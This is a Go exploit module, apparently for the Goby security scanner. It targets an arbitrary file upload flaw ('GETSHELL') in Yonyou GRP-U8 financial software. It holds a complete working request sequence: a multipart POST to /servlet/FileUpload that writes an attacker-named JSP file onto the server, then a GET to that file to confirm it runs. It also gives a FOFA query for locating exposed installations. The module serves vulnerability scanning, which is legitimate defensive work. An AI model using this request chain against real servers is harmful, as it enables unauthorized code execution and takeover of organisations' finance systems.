package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "用友 GRP-U8 FileUpload任意文件上传GETSHELL",
    "Description": "用友 GRP-U8 财务管理软件\n该servlet存在漏洞，可通过GET参数fileName控制上传的文件名\n/servlet/FileUpload\n随便构造一个表单，上传任意文件即可",
    "Author": "紫云",
    "Product": "用友-GRP-U8",
    "Homepage": "seeyon.com",
    "DisclosureDate": "2015-05-05",
    "Level": "3",
    "FofaQuery": "(body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || title=\"用友GRP-U8\")",
    "References": [
        "http://bobao.360.cn/snapshot/index?id=72849"
    ],
    "Impact": "<p>导致黑客可以上传恶意文件到服务器，获取服务器权限</p>",
    "Recommendation": "<p>1.上传文件的存储目录禁用执行权限</p><p>2.对上传的文件后缀采用白名单机制进行限制。</p>",
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/FileUpload?fileName=202cb962ac590.jsp&actionID=update",
                "data": "-----------------------------7950674229604\r\nContent-Disposition: form-data; name=\"rfile_name\"; filename=\"/202cb962ac590.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\r\n<%@page import=\"java.security.MessageDigest\"%>\r\n\r\n<%\r\nMessageDigest md5 = MessageDigest.getInstance(\"md5\");\r\nString str = \"\";\r\nbyte[] by = md5.digest(\"123\".getBytes());\r\nfor (int i = 0; i < by.length; i++) {\r\nstr += Byte.toString(by[i]);\r\n}\r\nSystem.out.println(str);\r\nout.print(str);\r\n%>\r\n\r\n-----------------------------7950674229604--",
                "header": {
                    "Content-Type": "multipart/form-data; boundary=---------------------------7950674229604"
                }
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200"
                    }
                ]
            }
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/R9iPortal/upload/202cb962ac590.jsp"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3244-7198-8489791-10675721453575112"
                    }
                ]
            }
        }
    ],
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "Tags": [
        "文件上传"
    ],
    "VulType": [
        "文件上传"
    ],
    "HasExp": false,
    "is0day": false,
    "GobyQuery": "(body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || title=\"用友GRP-U8\")",
    "PocId": "9944"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
